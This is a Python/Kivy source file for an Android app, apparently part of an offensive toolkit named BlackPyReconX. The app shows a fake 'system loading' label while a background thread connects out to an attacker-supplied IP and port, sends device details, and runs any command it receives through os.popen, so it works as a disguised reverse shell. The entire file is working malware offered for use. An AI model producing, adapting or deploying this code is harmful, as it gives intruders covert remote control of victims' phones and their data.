# android_apk/main.py

import os
import socket
import platform
import time
from datetime import datetime
from pathlib import Path
from threading import Thread
from kivy.app import App
from kivy.uix.label import Label

# 📁 Répertoire et fichier de log
LOG_DIR = Path("/sdcard/BlackPyReconX")
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "agent_android.log"

# 🛠️ IP / port injectés dynamiquement par packager.py
ATTACKER_IP = LHOST_PLACEHOLDER
ATTACKER_PORT = LPORT_PLACEHOLDER

def log(msg: str):
    ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{ts} {msg}\n")

def get_device_info():
    try:
        return {
            "OS": platform.system(),
            "Version": platform.version(),
            "Nom": platform.node(),
            "Architecture": platform.machine(),
            "Chemin": os.getcwd()
        }
    except Exception as e:
        log(f"[Erreur get_device_info] {e}")
        return {}

def send_device_info(sock):
    try:
        info = get_device_info()
        for k, v in info.items():
            sock.send(f"{k}: {v}\n".encode())
    except Exception as e:
        log(f"[Erreur Info système] {e}")

def reverse_shell():
    try:
        time.sleep(2)
        sock = socket.socket()
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        sock.send("[+] Connexion Android établie.\n".encode())
        send_device_info(sock)

        while True:
            cmd = sock.recv(1024).decode().strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            output = os.popen(cmd).read()
            if not output:
                output = "[Aucune sortie]\n"
            sock.send(output.encode(errors="ignore"))

        sock.close()
        log("Session terminée.")
    except Exception as e:
        log(f"[Erreur reverse_shell] {e}")

class AgentApp(App):
    def build(self):
        log("Agent .APK lancé.")
        Thread(target=reverse_shell, daemon=True).start()
        return Label(text="Chargement système en cours...", font_size='18sp')

if __name__ == "__main__":
    AgentApp().run()
